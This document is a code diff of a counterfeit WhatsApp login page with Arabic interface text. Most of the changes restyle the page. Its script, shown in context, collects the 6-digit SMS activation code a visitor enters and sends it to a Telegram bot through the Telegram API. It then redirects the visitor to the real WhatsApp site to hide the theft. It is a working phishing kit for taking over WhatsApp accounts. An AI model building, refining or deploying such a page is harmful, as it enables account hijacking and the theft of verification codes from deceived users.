@@ -5,160 +5,153 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    <title>WhatsApp Registration</title>
+    <title>WhatsApp Login</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #FAF3E7;
             margin: 0;
             padding: 0;
+            background-color: #FAF3E7;
+            height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
-            height: 100vh;
         }
 
-        .navbar {
-            width: 100%;
+        /* الشريط العلوي */
+        header {
             background-color: #25D366;
-            color: #fff;
-            padding: 10px 20px;
+            color: white;
             display: flex;
-            justify-content: space-between;
             align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
             font-size: 18px;
-        }
-
-        .navbar .back-btn {
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        .navbar .title {
             font-weight: bold;
         }
 
-        .container {
-            text-align: center;
-            background-color: #fff;
-            border-radius: 15px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            padding: 30px 20px;
-            width: 90%;
-            max-width: 400px;
+        header .logo {
+            display: flex;
+            align-items: center;
         }
 
-        .logo {
+        header .logo img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        header .menu {
+            cursor: pointer;
+            font-size: 22px;
+        }
+
+        /* المحتوى */
+        .container {
+            flex: 1;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
+            padding: 20px;
+        }
+
+        .container .logo img {
+            height: 80px;
             margin-bottom: 20px;
         }
 
-        .logo img {
-            height: 60px;
-        }
-
-        .title {
+        .container .title {
             font-size: 22px;
             font-weight: bold;
-            margin-bottom: 15px;
             color: #333;
+            margin-bottom: 15px;
         }
 
-        .description {
+        .container .description {
             font-size: 14px;
             color: #555;
-            line-height: 1.6;
+            text-align: center;
             margin-bottom: 20px;
         }
 
-        .form-group {
+        .container .form-group {
             display: flex;
             flex-direction: column;
-            gap: 10px;
             align-items: center;
+            gap: 10px;
+            width: 100%;
+            max-width: 300px;
         }
 
-        input {
+        .container input {
             border: 1px solid #ddd;
             border-radius: 6px;
             padding: 10px;
             font-size: 16px;
             width: 100%;
-            max-width: 300px;
             text-align: center;
         }
 
-        button {
+        .container button {
             padding: 12px 20px;
             background-color: #25D366;
-            color: #fff;
+            color: white;
             border: none;
             border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
             width: 100%;
-            max-width: 300px;
         }
 
-        button:hover {
+        .container button:hover {
             background-color: #1DA955;
         }
 
-        .footer {
-            width: 100%;
+        /* الشريط السفلي */
+        footer {
             background-color: #f1f1f1;
             color: #888;
-            padding: 10px 20px;
             text-align: center;
+            padding: 10px;
             font-size: 12px;
         }
 
-        .footer a {
+        footer a {
             color: #25D366;
             text-decoration: none;
-            font-weight: bold;
         }
     </style>
 </head>
 
 <body>
     <!-- الشريط العلوي -->
-    <div class="navbar">
-        <div class="back-btn">←</div>
-        <div class="title">واتساب</div>
-    </div>
-
-    <!-- الحاوية الرئيسية -->
-    <div class="container">
-        <!-- شعار واتساب -->
+    <header>
         <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+            واتساب
         </div>
+        <div class="menu">☰</div>
+    </header>
 
-        <!-- العنوان -->
+    <!-- المحتوى -->
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+        </div>
         <div class="title">تسجيل الدخول</div>
-
-        <!-- الوصف -->
         <div class="description">
             أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
         </div>
-
-        <!-- نموذج الإدخال -->
         <div class="form-group">
             <input id="phoneNumber" type="text" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
+            <button onclick="sendMessage()">متابعة</button>
         </div>
-
-        <!-- زر المتابعة -->
-        <button onclick="sendMessage()">متابعة</button>
     </div>
 
     <!-- الشريط السفلي -->
-    <div class="footer">
-        <p>واتساب هو تطبيق مراسلة مجاني وآمن. <br> لمزيد من المعلومات، قم بزيارة <a href="https://www.whatsapp.com/">موقع واتساب الرسمي</a>.</p>
-    </div>
+    <footer>
+        © 2024 واتساب. جميع الحقوق محفوظة. <br>
+        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
+    </footer>
 
     <script>
         // بيانات API Telegram
@@ -176,10 +169,8 @@
                 return;
             }
 
-            // إنشاء الرسالة
+            // إرسال الرسالة
             const message = `رمز التفعيل: ${phoneNumber}`;
-
-            // إرسال الرسالة عبر Telegram API
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -194,14 +185,14 @@
                 .then(data => {
                     if (data.ok) {
                         alert('تم إرسال رمز التفعيل بنجاح!');
-                        phoneNumberInput.value = ''; // إعادة تعيين الحقل
-                        window.location.href = "https://www.whatsapp.com"; // إعادة توجيه المستخدم
+                        phoneNumberInput.value = '';
+                        window.location.href = "https://www.whatsapp.com";
                     } else {
-                        alert('حدث خطأ أثناء إرسال رمز التفعيل. يرجى المحاولة لاحقاً.');
+                        alert('حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً.');
                     }
                 })
                 .catch(error => {
-                    alert('فشل الاتصال بالخادم. يرجى التحقق من الإنترنت والمحاولة مرة أخرى.');
+                    alert('فشل الاتصال بالخادم. تأكد من اتصال الإنترنت.');
                 });
         }
     </script>
